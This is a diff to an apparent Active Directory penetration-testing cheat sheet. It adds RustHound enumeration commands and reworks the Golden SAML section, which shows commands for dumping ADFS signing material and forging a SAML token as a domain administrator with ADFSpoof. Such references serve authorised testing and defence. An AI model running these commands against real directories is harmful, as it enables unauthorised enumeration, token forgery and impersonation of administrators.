@@ -228,10 +228,11 @@
 Use the correct collector
 * AzureHound for Azure Active Directory
 * SharpHound for local Active Directory
+* RustHound for local Active Directory
 
-* use [AzureHound](https://github.com/BloodHoundAD/AzureHound) (more info: [Cloud - Azure Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#azure-recon-tools))
+* use [BloodHoundAD/AzureHound](https://github.com/BloodHoundAD/AzureHound) (more info: [Cloud - Azure Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#azure-recon-tools))
 
-* use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+* use [BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
   ```powershell
   # run the collector on the machine using SharpHound.exe
   # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
@@ -265,6 +266,15 @@ Use the correct collector
   certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
   certipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound
   certipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123
+  ```
+* use [OPENCYBER-FR/RustHound](https://github.com/OPENCYBER-FR/RustHound)
+  ```ps1
+  # Windows with GSSAPI session
+  rusthound.exe -d domain.local --ldapfqdn domain
+  # Windows/Linux simple bind connection username:password
+  rusthound.exe -d domain.local -u user@domain.local -p Password123 -o output -z
+  # Linux with username:password and ADCS module for @ly4k BloodHound version
+  rusthound -d domain.local -u 'user@domain.local' -p 'Password123' -o /tmp/adcs --adcs -z
   ```
 
 Then import the zip/json files into the Neo4J database and query them.
@@ -2683,20 +2693,20 @@ Exploitation:
 
 #### ADFS - Golden SAML
 
-Requirements:
+**Requirements**:
 * ADFS service account
 * The private key (PFX with the decryption password)
 
-Exploit:
-* Use [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) to dump ADFS informations
-* Convert PFX and Private key to binary format
+**Exploitation**:
+* Run [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): `\\.\pipe\MICROSOFT##WID\tsql\query`
+* Convert PFX and Private Key to binary format
     ```ps1
     # For the pfx
     echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
     # For the private key
     echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
     ```
-* Create the Golden SAML using [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof)
+* Create the Golden SAML using [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof), you might need to update the [dependencies](https://github.com/szymex73/ADFSpoof).
     ```ps1
     mkdir ADFSpoofTools
     cd $_
@@ -2711,9 +2721,12 @@ Exploit:
     pip install -e .
     cd ../ADFSpoof
     pip install -r requirements.txt
-    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin  -s adfs.pentest.lab  saml2 --endpoint https://www.contoso.com/adfs/ls
+    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
     /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
     ```
+
+Other interesting tools to exploit AD FS: 
+* [WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml)
 
 
 ### UnPAC The Hash
@@ -4134,3 +4147,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive](https://znlive.com/xmlserializer-deserialization-vulnerability)
 * [Practical guide for Golden SAML - Practical guide step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)
 * [Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
+* [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)
